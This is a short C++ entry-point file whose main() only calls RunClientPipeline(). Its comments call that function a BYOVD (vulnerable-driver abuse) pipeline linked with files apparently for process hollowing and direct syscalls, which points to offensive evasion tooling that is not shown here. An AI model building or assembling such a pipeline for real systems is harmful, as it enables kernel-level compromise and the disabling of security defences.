// Standalone entry point — calls the BYOVD pipeline directly.
// Link together with client.cpp, hollow.cpp, syscall_stub.obj.
int RunClientPipeline();

int main() {
    return RunClientPipeline();
}
